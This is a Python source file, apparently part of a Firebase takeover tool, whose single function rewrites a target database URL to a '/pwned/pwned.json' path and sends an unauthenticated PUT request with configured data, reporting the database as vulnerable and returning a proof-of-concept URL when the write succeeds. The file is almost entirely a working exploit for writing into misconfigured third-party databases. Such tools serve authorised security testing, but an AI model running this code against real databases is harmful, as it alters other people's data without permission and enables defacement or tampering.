try:
    from printy import printy
    import requests
    from util.config import config
    import sys
except:
    print("Requirements Error ,Please install requirements from requirements.txt")
    sys.exit()

def Takeover(url):
    printy("\n\n[*]Attempting to takeover " + url + " and generating a POC URL\n",'y>')
    #Firebase Database always has SSL
    if(url.startswith("http://")):
        t1="https://"
        url=t1 + url[7:]
        url=url.strip().strip("/")
    #url doesn't start with both http or https
    if not url.startswith("http"):
        url=url.strip().strip("/")
        url = "https://" + url + '/pwned/pwned.json'
    #url starts with https
    else:
        url=url.strip().strip("/")
        url=url+'/pwned/pwned.json'
    try:
        response = requests.put(url,data=config)
    except:
        printy("Error Try Checking your Internet",'r>')
        return ""

    if response.status_code==200:
        printy("\[*\]Firebase Database is Vulnerable",'n')
        printy("==>POC URL:\t[wBU]{}@".format(url),predefined="n")
        return url

    elif response.status_code==401:
        printy("\[*\]Permission Denied","r>")
        return ''
    elif response.status_code==404:
        printy("\[*\]No Such Database Exists at:"+url,"r>")
        return ''
    else:
        printy("\[*\]Unknown Error",'r>')
        return ''
        
    
